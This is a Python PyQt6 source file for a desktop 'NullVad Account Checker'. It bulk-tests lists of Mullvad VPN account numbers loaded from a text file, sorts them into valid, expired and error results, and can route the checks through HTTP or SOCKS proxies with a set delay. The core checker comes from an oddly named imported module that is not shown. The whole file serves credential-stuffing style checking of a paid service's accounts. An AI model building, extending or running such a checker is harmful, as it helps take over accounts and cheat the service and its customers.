import sys
import os
import time
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                            QHBoxLayout, QPushButton, QLabel, QFrame,
                            QTableWidget, QTableWidgetItem, QHeaderView, QFileDialog, 
                            QMessageBox, QSpinBox, QLineEdit, QCheckBox, QComboBox,
                            QMenu, QMenuBar, QDialog, QDialogButtonBox, QInputDialog,
                            QTextEdit)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QColor, QPalette, QFont, QAction
import importsubprocess as checker
import logging

class ProxySettingsDialog(QDialog):
    def __init__(self, parent=None, proxy_type="SOCKS5", proxy="", use_proxy=False):
        super().__init__(parent)
        self.setWindowTitle("Proxy Settings")
        self.setModal(True)
        self.setMinimumWidth(400)
        self.setStyleSheet("""
            QDialog {
                background-color: #2d2d2d;
                color: white;
            }
            QLabel {
                color: white;
            }
            QComboBox, QLineEdit {
                background-color: #3d3d3d;
                color: white;
                border: 1px solid #555;
                padding: 5px;
            }
            QCheckBox {
                color: white;
            }
            QPushButton {
                background-color: #3d3d3d;
                color: white;
                border: 1px solid #555;
                padding: 5px 15px;
                min-width: 80px;
            }
            QPushButton:hover {
                background-color: #4d4d4d;
            }
        """)

        layout = QVBoxLayout(self)
        layout.setSpacing(10)

        # Proxy type selection
        type_layout = QHBoxLayout()
        type_label = QLabel("Proxy Type:")
        self.proxy_type = QComboBox()
        self.proxy_type.addItems(["HTTP", "HTTPS", "SOCKS4", "SOCKS5"])
        self.proxy_type.setCurrentText(proxy_type)
        type_layout.addWidget(type_label)
        type_layout.addWidget(self.proxy_type)
        layout.addLayout(type_layout)

        # Proxy string input
        proxy_layout = QHBoxLayout()
        proxy_label = QLabel("Proxy:")
        self.proxy_input = QLineEdit()
        self.proxy_input.setPlaceholderText("Domain:Port:Username:Password")
        self.proxy_input.setText(proxy)
        proxy_layout.addWidget(proxy_label)
        proxy_layout.addWidget(self.proxy_input)
        layout.addLayout(proxy_layout)

        # Help text
        help_label = QLabel("Format: Domain:Port:Username:Password\nExample: proxy.example.com:1080:user:pass")
        help_label.setStyleSheet("color: #888; font-size: 10px;")
        layout.addWidget(help_label)

        # Enable proxy checkbox
        self.use_proxy = QCheckBox("Enable Proxy")
        self.use_proxy.setChecked(use_proxy)
        layout.addWidget(self.use_proxy)

        # Buttons
        button_box = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel
        )
        button_box.accepted.connect(self.accept)
        button_box.rejected.connect(self.reject)
        layout.addWidget(button_box)

    def get_settings(self):
        return {
            'proxy_type': self.proxy_type.currentText(),
            'proxy': self.proxy_input.text(),
            'use_proxy': self.use_proxy.isChecked()
        }

class AccountCheckerThread(QThread):
    progress = pyqtSignal(dict)
    
    def __init__(self, accounts, delay=0, proxy=None, proxy_type=None):
        super().__init__()
        self.accounts = accounts
        self.delay = delay
        self.proxy = proxy
        self.proxy_type = proxy_type
        self.is_running = True
        self.checker = checker.MullvadChecker()
        if proxy and proxy_type:
            self.checker.set_proxy(proxy, proxy_type)

    def run(self):
        for account in self.accounts:
            if not self.is_running:
                break

            try:
                # Check account
                success, error = self.checker.check_account_set(account)
                if success:
                    status = self.checker.check_account_validity(account)
                    if status.is_valid:
                        self.progress.emit({
                            "account": account,
                            "status": "Valid",
                            "message": f"Valid until {status.expiry_date.strftime('%Y-%m-%d')}"
                        })
                    else:
                        self.progress.emit({
                            "account": account,
                            "status": "Invalid",
                            "message": "Account expired"
                        })
                    self.checker.logout_account()
                else:
                    self.progress.emit({
                        "account": account,
                        "status": "Invalid",
                        "message": error or "Unknown error"
                    })

                # Apply rate limiting
                if self.is_running and self.delay > 0:
                    time.sleep(self.delay)

            except Exception as e:
                self.progress.emit({
                    "account": account,
                    "status": "Error",
                    "message": str(e)
                })

    def stop(self):
        self.is_running = False
        if self.checker:
            self.checker.logout_account()

class MullvadCheckerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("NullVad Account Checker")
        self.setMinimumSize(800, 600)
        self.checker_thread = None
        self.accounts = []
        self.proxy_type = "SOCKS5"  # Default proxy type
        self.proxy = ""
        self.use_proxy = False
        self.delay = 2  # Default delay
        
        # Initialize logger
        self.log_handler = checker.LogHandler()
        self.logger = self.log_handler.logger
        
        self.initUI()

    def initUI(self):
        # Create menu bar
        menubar = self.menuBar()
        
        # Settings menu
        settings_menu = menubar.addMenu('Settings')
        proxy_action = QAction('Proxy Settings', self)
        proxy_action.triggered.connect(self.show_proxy_settings)
        settings_menu.addAction(proxy_action)
        delay_action = QAction('Set Delay', self)
        delay_action.triggered.connect(self.set_delay)
        settings_menu.addAction(delay_action)
        
        # Help menu
        help_menu = menubar.addMenu('Help')
        report_action = QAction('Send Error Report', self)
        report_action.triggered.connect(self.send_error_report)
        help_menu.addAction(report_action)
        
        # Main widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        layout.setSpacing(10)
        layout.setContentsMargins(10, 10, 10, 10)

        # Status bar for settings info
        status_layout = QHBoxLayout()
        self.proxy_status = QLabel("Proxy: Disabled")
        self.delay_status = QLabel("Delay: 2s")
        self.proxy_status.setStyleSheet("color: #888;")
        self.delay_status.setStyleSheet("color: #888;")
        status_layout.addWidget(self.proxy_status)
        status_layout.addWidget(self.delay_status)
        status_layout.addStretch()
        layout.addLayout(status_layout)

        # Buttons row
        buttons_layout = QHBoxLayout()
        self.load_btn = QPushButton("Load Accounts")
        self.start_btn = QPushButton("Start Checking")
        self.stop_btn = QPushButton("Stop")
        self.save_btn = QPushButton("Save Results")
        
        self.stop_btn.setStyleSheet("background-color: #FFB6C1;")  # Light pink color
        
        buttons = [self.load_btn, self.start_btn, self.stop_btn, self.save_btn]
        for btn in buttons:
            btn.setFixedHeight(30)
            buttons_layout.addWidget(btn)
            
        layout.addLayout(buttons_layout)

        # Stats row
        stats_layout = QHBoxLayout()
        self.total_label = QLabel("Total: 0")
        self.valid_label = QLabel("Valid: 0")
        self.invalid_label = QLabel("Invalid: 0")
        self.errors_label = QLabel("Errors: 0")
        
        stats = [self.total_label, self.valid_label, self.invalid_label, self.errors_label]
        for stat in stats:
            stat.setStyleSheet("color: white;")
            stats_layout.addWidget(stat)
            
        layout.addLayout(stats_layout)

        # Table
        self.table = QTableWidget()
        self.table.setColumnCount(3)
        self.table.setHorizontalHeaderLabels(["Account Number", "Status", "Message"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.table.setStyleSheet("""
            QTableWidget {
                background-color: #2d2d2d;
                gridline-color: #666;
                color: white;
            }
            QHeaderView::section {
                background-color: #3d3d3d;
                color: white;
                padding: 5px;
                border: 1px solid #666;
            }
        """)
        layout.addWidget(self.table)

        # Connect signals
        self.load_btn.clicked.connect(self.load_accounts)
        self.start_btn.clicked.connect(self.start_checking)
        self.stop_btn.clicked.connect(self.stop_checking)
        self.save_btn.clicked.connect(self.save_results)

        # Update status display
        self.update_status_display()

    def show_proxy_settings(self):
        dialog = ProxySettingsDialog(self, self.proxy_type, self.proxy, self.use_proxy)
        if dialog.exec():
            settings = dialog.get_settings()
            self.proxy_type = settings['proxy_type']
            self.proxy = settings['proxy']
            self.use_proxy = settings['use_proxy']
            self.update_status_display()
            self.logger.info(f"Proxy settings updated - Type: {self.proxy_type}, Enabled: {self.use_proxy}")

    def set_delay(self):
        delay, ok = QInputDialog.getInt(self, 'Set Delay',
                                      'Enter delay between checks (seconds):',
                                      self.delay, 0, 60)
        if ok:
            self.delay = delay
            self.update_status_display()
            self.logger.info(f"Delay set to {self.delay} seconds")

    def update_status_display(self):
        if self.use_proxy:
            self.proxy_status.setText(f"Proxy: {self.proxy_type} - {self.proxy}")
        else:
            self.proxy_status.setText("Proxy: Disabled")
        self.delay_status.setText(f"Delay: {self.delay}s")

    def load_accounts(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Open File", "", "Text Files (*.txt)")
        if file_name:
            try:
                with open(file_name, 'r') as file:
                    self.accounts = [line.strip() for line in file if line.strip()]
                self.total_label.setText(f"Total: {len(self.accounts)}")
                self.valid_count = 0
                self.invalid_count = 0
                self.error_count = 0
                self.valid_label.setText("Valid: 0")
                self.invalid_label.setText("Invalid: 0")
                self.errors_label.setText("Errors: 0")
                self.table.setRowCount(0)
                self.logger.info(f"Loaded {len(self.accounts)} accounts from {file_name}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to read file: {str(e)}")
                self.logger.error(f"Failed to load accounts: {str(e)}")

    def start_checking(self):
        if self.accounts:
            self.valid_count = 0
            self.invalid_count = 0
            self.error_count = 0
            self.table.setRowCount(0)
            proxy = self.proxy if self.use_proxy else None
            proxy_type = self.proxy_type if self.use_proxy else None
            
            self.checker_thread = AccountCheckerThread(
                self.accounts, 
                self.delay, 
                proxy, 
                proxy_type
            )
            self.checker_thread.progress.connect(self.update_progress)
            self.checker_thread.start()
            
            self.start_btn.setEnabled(False)
            self.load_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            
            self.logger.info("Started checking accounts")
        else:
            QMessageBox.warning(self, "Warning", "Please load accounts first!")

    def update_progress(self, data):
        account = data["account"]
        status = data["status"]
        message = data["message"]

        # Update counts
        if status == "Valid":
            self.valid_count += 1
            self.valid_label.setText(f"Valid: {self.valid_count}")
        elif status == "Invalid":
            self.invalid_count += 1
            self.invalid_label.setText(f"Invalid: {self.invalid_count}")
        elif status == "Error":
            self.error_count += 1
            self.errors_label.setText(f"Errors: {self.error_count}")

        # Add to table
        row = self.table.rowCount()
        self.table.insertRow(row)
        self.table.setItem(row, 0, QTableWidgetItem(account))
        self.table.setItem(row, 1, QTableWidgetItem(status))
        self.table.setItem(row, 2, QTableWidgetItem(message))

        # Color coding
        color = {
            "Valid": QColor("#90EE90"),  # Light green
            "Invalid": QColor("#FFB6C1"),  # Light red
            "Error": QColor("#FFE4B5")  # Light orange
        }.get(status, QColor("white"))

        for col in range(3):
            self.table.item(row, col).setBackground(color)

    def stop_checking(self):
        if self.checker_thread and self.checker_thread.isRunning():
            self.checker_thread.stop()
            self.checker_thread.wait()
            self.start_btn.setEnabled(True)
            self.load_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.logger.info("Stopped checking accounts")

    def save_results(self):
        if self.table.rowCount() == 0:
            QMessageBox.warning(self, "Warning", "No results to save!")
            return

        file_name, _ = QFileDialog.getSaveFileName(self, "Save Results", "", "Text Files (*.txt)")
        if file_name:
            try:
                with open(file_name, 'w') as file:
                    for row in range(self.table.rowCount()):
                        account = self.table.item(row, 0).text()
                        status = self.table.item(row, 1).text()
                        message = self.table.item(row, 2).text()
                        file.write(f"{account} - {status} - {message}\n")
                QMessageBox.information(self, "Success", "Results saved successfully!")
                self.logger.info(f"Results saved to {file_name}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save results: {str(e)}")
                self.logger.error(f"Failed to save results: {str(e)}")

    def send_error_report(self):
        """Prepare and display error report for sending"""
        report = self.log_handler.prepare_error_report()
        
        dialog = QDialog(self)
        dialog.setWindowTitle("Error Report")
        dialog.setMinimumWidth(600)
        dialog.setMinimumHeight(400)
        
        layout = QVBoxLayout(dialog)
        
        # Report content
        text_edit = QTextEdit()
        text_edit.setPlainText(report)
        text_edit.setReadOnly(True)
        layout.addWidget(text_edit)
        
        # Instructions
        instructions = QLabel(
            "Please copy this error report and send it to: null@nullme.dev\n"
            "This will help us improve the application and fix any issues."
        )
        instructions.setStyleSheet("color: #888; padding: 10px;")
        layout.addWidget(instructions)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        copy_btn = QPushButton("Copy to Clipboard")
        copy_btn.clicked.connect(lambda: self.copy_to_clipboard(report))
        
        clear_btn = QPushButton("Clear Error Log")
        clear_btn.clicked.connect(self.clear_error_log)
        
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(dialog.close)
        
        button_layout.addWidget(copy_btn)
        button_layout.addWidget(clear_btn)
        button_layout.addWidget(close_btn)
        layout.addLayout(button_layout)
        
        dialog.exec()

    def copy_to_clipboard(self, text):
        """Copy text to clipboard"""
        clipboard = QApplication.clipboard()
        clipboard.setText(text)
        QMessageBox.information(self, "Success", "Error report copied to clipboard!")

    def clear_error_log(self):
        """Clear the error log file"""
        if self.log_handler.clear_error_log():
            QMessageBox.information(self, "Success", "Error log cleared successfully!")
        else:
            QMessageBox.warning(self, "Warning", "Failed to clear error log!")

def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')  # Use Fusion style for better dark theme support
    
    # Set dark theme palette
    palette = QPalette()
    palette.setColor(QPalette.ColorRole.Window, QColor(53, 53, 53))
    palette.setColor(QPalette.ColorRole.WindowText, Qt.GlobalColor.white)
    palette.setColor(QPalette.ColorRole.Base, QColor(35, 35, 35))
    palette.setColor(QPalette.ColorRole.AlternateBase, QColor(53, 53, 53))
    palette.setColor(QPalette.ColorRole.ToolTipBase, QColor(25, 25, 25))
    palette.setColor(QPalette.ColorRole.ToolTipText, Qt.GlobalColor.white)
    palette.setColor(QPalette.ColorRole.Text, Qt.GlobalColor.white)
    palette.setColor(QPalette.ColorRole.Button, QColor(53, 53, 53))
    palette.setColor(QPalette.ColorRole.ButtonText, Qt.GlobalColor.white)
    palette.setColor(QPalette.ColorRole.BrightText, Qt.GlobalColor.red)
    palette.setColor(QPalette.ColorRole.Link, QColor(42, 130, 218))
    palette.setColor(QPalette.ColorRole.Highlight, QColor(42, 130, 218))
    palette.setColor(QPalette.ColorRole.HighlightedText, QColor(35, 35, 35))
    app.setPalette(palette)
    
    window = MullvadCheckerGUI()
    window.show()
    sys.exit(app.exec())

if __name__ == '__main__':
    main()
